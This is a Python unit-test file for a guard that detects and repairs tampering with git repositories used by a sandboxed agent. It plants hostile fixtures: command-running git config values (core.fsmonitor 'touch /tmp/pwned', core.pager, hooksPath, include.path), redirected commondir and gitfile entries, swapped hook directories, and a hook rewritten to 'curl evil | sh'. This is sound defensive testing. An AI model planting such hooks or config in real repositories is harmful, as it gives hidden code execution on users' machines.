"""The mount-mode guard, in process: what it flags, how it repairs, the baseline."""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any

from kbx import config, guard, paths, sandbox
from kbx.errors import KbxError
from tests.unit.helpers import TempHome
from tests.unit.helpers import git as run_git

PROTECT = config.WorkspaceConfig().protect


class GuardTest(TempHome):
    def setUp(self) -> None:
        super().setUp()
        self.repo = self.make_repo("project")
        self.paths = paths.resolve({"HOME": str(self.home)})
        self.sb = sandbox.for_project(self.repo, "mount")
        self.guard = guard.Guard(self.paths, self.sb.name)

    def trust(self) -> None:
        with self.guard.lock():
            self.guard.trust_locked(self.repo, PROTECT)

    def check(self) -> list[dict[str, Any]]:
        with self.guard.lock():
            state = self.guard.load_state()
            assert state is not None
            return self.guard.check_locked(state, walk=True)

    def paths_of(self, actions: list[dict[str, Any]]) -> list[str]:
        return sorted(a["path"] for a in actions)

    def config(self, *args: str, repo: Path | None = None) -> None:
        run_git(repo or self.repo, "config", *args)

    def test_safe_config_and_commits_pass(self) -> None:
        self.config("core.pager", "less")  # the user's own: part of the baseline
        self.trust()
        self.config("branch.main.description", "x")
        self.config("remote.origin.fetch", "+refs/heads/*:refs/remotes/origin/*")
        self.config("core.fsmonitor", "true")
        (self.repo / "a.txt").write_text("a")
        run_git(self.repo, "add", "a.txt")
        run_git(self.repo, "commit", "-q", "-m", "a")
        run_git(self.repo, "checkout", "-q", "-b", "topic")
        run_git(self.repo, "worktree", "add", "-q", str(self.temp / "wt"))
        self.assertEqual(self.check(), [])
        self.assertTrue(guard.is_safe("color.ui", "auto", self.repo / ".git", self.repo))

    def test_config_that_runs_programs_is_removed(self) -> None:
        self.config("core.pager", "less")
        self.trust()
        for key, value in (
            ("core.fsmonitor", "touch /tmp/pwned"),
            ("core.pager", "evil"),
            ("core.hooksPath", "/tmp"),
            ("include.path", "../evil.cfg"),
            ("core.worktree", "/home"),
            ("remote.origin.uploadpack", "evil"),
            ("core.bare", "true"),
            ("diff.x.textconv", "evil"),
        ):
            self.config(key, value)
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".git/config"])
        self.assertIn("core.fsmonitor=touch /tmp/pwned", actions[0]["detail"])
        self.assertIn("core.pager=evil", actions[0]["detail"])
        self.assertTrue(Path(actions[0]["quarantine"]).is_file())
        remaining = run_git(self.repo, "config", "--file", ".git/config", "--list")
        self.assertIn("core.pager=less", remaining)
        for gone in ("fsmonitor", "evil", "hookspath", "include", "worktree", "uploadpack", "bare=true", "textconv"):
            self.assertNotIn(gone, remaining.lower())
        self.assertEqual(self.check(), [])

    def test_hooks_are_quarantined_or_restored(self) -> None:
        hooks = self.repo / ".git" / "hooks"
        (hooks / "pre-push").write_text("#!/bin/sh\nmine\n")
        self.trust()
        (hooks / "pre-push").write_text("#!/bin/sh\nevil\n")
        (hooks / "post-checkout").write_text("#!/bin/sh\nevil\n")
        (hooks / "pre-commit.sample").write_text("ignored\n")
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".git/hooks/post-checkout", ".git/hooks/pre-push"])
        self.assertEqual((hooks / "pre-push").read_text(), "#!/bin/sh\nmine\n")
        self.assertFalse((hooks / "post-checkout").exists())

    def test_hooks_directory_swapped_for_a_symlink(self) -> None:
        hooks = self.repo / ".git" / "hooks"
        (hooks / "pre-push").write_text("mine\n")
        self.trust()
        (self.repo / "evilhooks").mkdir()
        os.rename(hooks, self.repo / "oldhooks")
        hooks.symlink_to(self.repo / "evilhooks")
        actions = self.check()
        self.assertIn(".git/hooks", self.paths_of(actions))
        self.assertFalse(hooks.is_symlink())
        self.assertEqual((hooks / "pre-push").read_text(), "mine\n")

    def test_commondir_redirect(self) -> None:
        self.trust()
        (self.repo / ".git" / "commondir").write_text("../evil\n")
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".git/commondir"])
        self.assertFalse((self.repo / ".git" / "commondir").exists())

    def test_worktree_commondir_must_point_home(self) -> None:
        run_git(self.repo, "worktree", "add", "-q", str(self.temp / "wt"))
        self.trust()
        commondir = self.repo / ".git" / "worktrees" / "wt" / "commondir"
        commondir.write_text("../../../evil\n")
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".git/worktrees/wt/commondir"])
        self.assertEqual(commondir.read_text(), "../..\n")
        run_git(self.temp / "wt", "status")

    def test_submodule_config_and_hooks(self) -> None:
        library = self.make_repo("library")
        run_git(self.repo, "-c", "protocol.file.allow=always", "submodule", "add", "-q", str(library), "lib")
        self.trust()
        module = self.repo / ".git" / "modules" / "lib"
        self.assertEqual(self.check(), [], "core.worktree inside the project is fine")
        self.config("core.sshCommand", "evil", repo=self.repo / "lib")
        (module / "hooks" / "pre-commit").write_text("evil\n")
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".git/modules/lib/config", ".git/modules/lib/hooks/pre-commit"])

    def test_nested_repository(self) -> None:
        self.trust()
        nested = self.repo / "vendor" / "x"
        nested.mkdir(parents=True)
        run_git(self.repo, "clone", "-q", str(self.make_repo("upstream")), str(nested))
        self.assertEqual(self.check(), [], "a plain nested clone is fine")
        self.config("core.fsmonitor", "evil", repo=nested)
        actions = self.check()
        self.assertEqual(self.paths_of(actions), ["vendor/x/.git/config"])

    def test_protected_files(self) -> None:
        husky = self.repo / ".husky"
        husky.mkdir()
        (husky / "pre-commit").write_text("npm test\n")
        self.trust()
        (husky / "pre-commit").write_text("curl evil | sh\n")
        (self.repo / ".pre-commit-config.yaml").write_text("repos: []\n")
        (self.repo / "src.py").write_text("print(1)\n")  # ordinary files are the user's to review
        actions = self.check()
        self.assertEqual(self.paths_of(actions), [".husky/pre-commit", ".pre-commit-config.yaml"])
        self.assertEqual((husky / "pre-commit").read_text(), "npm test\n")
        self.assertFalse((self.repo / ".pre-commit-config.yaml").exists())

    def test_in_tree_hooks_path(self) -> None:
        hooks = self.repo / "tools" / "hooks"
        hooks.mkdir(parents=True)
        (hooks / "pre-commit").write_text("lint\n")
        self.config("core.hooksPath", "tools/hooks")
        self.trust()
        (hooks / "pre-commit").write_text("evil\n")
        self.assertEqual(self.paths_of(self.check()), ["tools/hooks/pre-commit"])

    def test_repair_that_fails_is_reported(self) -> None:
        if os.getuid() == 0:
            self.skipTest("root ignores directory permissions")
        self.trust()
        hooks = self.repo / ".git" / "hooks"
        (hooks / "pre-commit").write_text("evil\n")
        hooks.chmod(0o555)  # as root in the guest could: the move out fails
        self.addCleanup(hooks.chmod, 0o755)
        actions = self.check()
        self.assertIn("fix it by hand", actions[0]["action"])

    def test_replaced_git_directory_cannot_be_repaired(self) -> None:
        self.trust()
        os.rename(self.repo / ".git", self.repo / "real-git")
        (self.repo / ".git").write_text("gitdir: evil\n")
        actions = self.check()
        self.assertEqual([(a["path"], a["kind"]) for a in actions], [(".git", "gitdir")])
        self.assertIn("by hand", actions[0]["action"])

    def test_before_start_seal_and_resolve(self) -> None:
        protect = list(PROTECT)
        guard.before_start(self.paths, self.sb, protect)  # first start: baseline
        self.assertEqual(self.guard.seal(), [])  # stopped cleanly
        hook = self.repo / ".git" / "hooks" / "pre-commit"
        hook.write_text("mine\n")
        guard.before_start(self.paths, self.sb, protect)  # sealed: the user's change is trusted
        self.assertTrue(hook.exists())
        hook.write_text("evil\n")  # unsealed: checked before it is trusted
        with self.assertRaises(KbxError) as ctx:
            guard.before_start(self.paths, self.sb, protect)
        self.assertIn("kbx resume", str(ctx.exception))
        self.assertEqual(hook.read_text(), "mine\n")
        with self.assertRaises(KbxError):
            guard.before_start(self.paths, self.sb, protect)  # until resolved
        report = "\n".join(guard.report(self.paths, self.sb))
        self.assertIn(".git/hooks/pre-commit: changed", report)
        self.assertIn("+evil", report)
        notes = guard.resolve(self.paths, self.sb, protect, accept=True)
        self.assertEqual(notes, ["restored .git/hooks/pre-commit (the agent's version)"])
        self.assertEqual(hook.read_text(), "evil\n")
        guard.before_start(self.paths, self.sb, protect)
        self.assertEqual(guard.report(self.paths, self.sb), [])

    def test_is_safe_core_worktree(self) -> None:
        gitdir = self.repo / ".git" / "modules" / "lib"
        self.assertTrue(guard.is_safe("core.worktree", "../../../lib", gitdir, self.repo))
        self.assertFalse(guard.is_safe("core.worktree", "../../../../elsewhere", gitdir, self.repo))
        self.assertFalse(guard.is_safe("core.worktree", "../..", gitdir, self.repo))
        self.assertFalse(guard.is_safe("remote.origin.uploadpack", "evil", gitdir, self.repo))
        self.assertTrue(guard.is_safe("remote.origin.fetch", "+x:y", gitdir, self.repo))


class WorktreeGuardTest(TempHome):
    """A linked worktree: its repository directory lies outside the checkout."""

    def setUp(self) -> None:
        super().setUp()
        self.main = self.make_repo("main")
        self.repo = self.temp / "wt"
        run_git(self.main, "worktree", "add", "-q", str(self.repo))
        self.paths = paths.resolve({"HOME": str(self.home)})
        self.sb = sandbox.for_project(self.repo, "mount")
        self.guard = guard.Guard(self.paths, self.sb.name)
        with self.guard.lock():
            self.guard.trust_locked(self.repo, PROTECT)

    def check(self) -> list[dict[str, Any]]:
        with self.guard.lock():
            state = self.guard.load_state()
            assert state is not None
            return self.guard.check_locked(state, walk=True)

    def test_work_in_the_worktree_passes(self) -> None:
        (self.repo / "a.txt").write_text("a")
        run_git(self.repo, "add", "a.txt")
        run_git(self.repo, "commit", "-q", "-m", "a")
        run_git(self.repo, "checkout", "-q", "-b", "topic")
        self.assertEqual(self.check(), [])

    def test_the_shared_repository_is_guarded(self) -> None:
        common = self.main / ".git"
        run_git(self.repo, "config", "core.fsmonitor", "evil")  # lands in the main repository's config
        (common / "hooks" / "pre-commit").write_text("evil\n")
        actions = self.check()
        self.assertEqual(sorted(a["path"] for a in actions), [f"{common}/config", f"{common}/hooks/pre-commit"])
        self.assertNotIn("fsmonitor", run_git(self.main, "config", "--list"))
        self.assertFalse((common / "hooks" / "pre-commit").exists())
        self.assertTrue(Path(actions[0]["quarantine"]).is_file())
        notes = guard.resolve(self.paths, self.sb, list(PROTECT), accept=True)
        self.assertEqual(len(notes), 2)
        self.assertEqual((common / "hooks" / "pre-commit").read_text(), "evil\n")

    def test_gitfile_redirect_is_repaired(self) -> None:
        original = (self.repo / ".git").read_text()
        evil = self.repo / "evilgit"
        evil.mkdir()
        (self.repo / ".git").write_text(f"gitdir: {evil}\n")
        actions = self.check()
        self.assertEqual([(a["path"], a["kind"]) for a in actions], [(".git", "gitfile")])
        self.assertEqual((self.repo / ".git").read_text(), original)
        (self.repo / ".git").unlink()
        (self.repo / ".git").mkdir()  # a whole fake repository in its place
        self.assertEqual([a["path"] for a in self.check()], [".git"])
        self.assertEqual((self.repo / ".git").read_text(), original)
        run_git(self.repo, "status")
